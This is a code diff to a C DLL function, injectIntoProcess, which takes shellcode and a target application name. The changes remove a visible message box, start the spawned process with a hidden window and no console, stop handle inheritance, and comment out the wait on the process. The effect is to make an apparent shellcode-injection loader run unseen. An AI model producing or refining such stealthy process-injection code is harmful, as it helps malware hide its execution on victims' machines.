@@ -380,8 +380,8 @@ DLLEXPORT VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCST
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );
-
-    MessageBoxA(lpApplicationName);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // Hide the window
 
     BOOL success = CreateProcessA
     (
@@ -389,8 +389,8 @@ DLLEXPORT VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCST
         NULL,                                   // lpCommandLine
         NULL,                                   // lpProcessAttributes
         NULL,                                   // lpThreadAttributes
-        TRUE,                                   // bInheritHandles
-        0,                                      // dwCreationFlags
+        FALSE,                                  // bInheritHandles
+        CREATE_NO_WINDOW,                       // dwCreationFlags
         NULL,                                   // lpEnvironment
         NULL,                                   // lpCurrentDirectory
         &si,                                    // lpStartupInfo
@@ -434,7 +434,7 @@ DLLEXPORT VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCST
         #endif
     }
 
-    WaitForSingleObject( pi.hProcess, INFINITE );
+    //WaitForSingleObject( pi.hProcess, INFINITE );
     CloseHandle( pi.hProcess );
     CloseHandle( pi.hThread );
     return;
